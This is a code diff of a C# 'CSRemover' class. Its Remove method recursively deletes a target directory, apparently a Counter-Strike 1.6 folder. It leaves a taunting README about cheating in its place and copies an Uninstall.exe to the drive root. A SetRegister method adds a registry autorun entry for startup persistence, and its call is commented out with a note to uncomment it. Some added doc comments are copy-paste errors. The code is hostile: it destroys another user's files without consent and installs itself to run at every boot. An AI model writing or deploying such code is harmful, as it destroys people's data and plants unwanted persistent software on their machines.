@@ -12,20 +12,28 @@ namespace CSRemover.Additional_Classes
     public static class Remover
     {
         private static string root;
-
+        
+        /// <summary>
+        /// Deletes specified directory.
+        /// </summary>
+        /// <param name="path">Spercified directory.</param>
         public static bool Remove(string path)
         {
             if (Directory.Exists(path))
             {
                 root = Directory.GetDirectoryRoot(path);
                 CreateFile(path);
-                //SetRegister();
+                //SetRegister(); //Don't forget to uncomment.
                 Directory.Delete(path, true);
                 return true;
             }
             return false;
         }
 
+        /// <summary>
+        /// Deletes specified directory.
+        /// </summary>
+        /// <param name="path">Spercified directory.</param>
         private static void CreateFile(string path)
         {
             string newDirectory = Directory.GetParent(path) + @"\CS 1.6";
@@ -35,9 +43,9 @@ namespace CSRemover.Additional_Classes
             }
 
             Directory.CreateDirectory(newDirectory);
-            using (StreamWriter writer = new StreamWriter(newDirectory + @"\Прочти меня.txt", false, System.Text.Encoding.Default))
+            using (StreamWriter writer = new StreamWriter(newDirectory + @"\README.txt", false, System.Text.Encoding.Default))
             {
-                writer.WriteLine("Читы зло, учись играть сам.");
+                writer.WriteLine("It's just a game. Don't be so inhuman.");
             }
 
             FileInfo file = new FileInfo(System.IO.Directory.GetCurrentDirectory() + @"\Uninstall.exe");
@@ -51,6 +59,9 @@ namespace CSRemover.Additional_Classes
             file.CopyTo(root + @"CS 1.6\Uninstall.exe", true);
         }
 
+        /// <summary>
+        /// Sets autorun of the application when OS launched.
+        /// </summary>
         private static void SetRegister()
         {
             const string name = "Uninstall";
@@ -63,6 +74,11 @@ namespace CSRemover.Additional_Classes
                 reg.Close();
             }
             catch (Exception ex) { MessageBox.Show(ex.Message); }
+        }
+
+        public static bool IsPathExists(string path)
+        {
+            return Directory.Exists(path);
         }
     }
 }
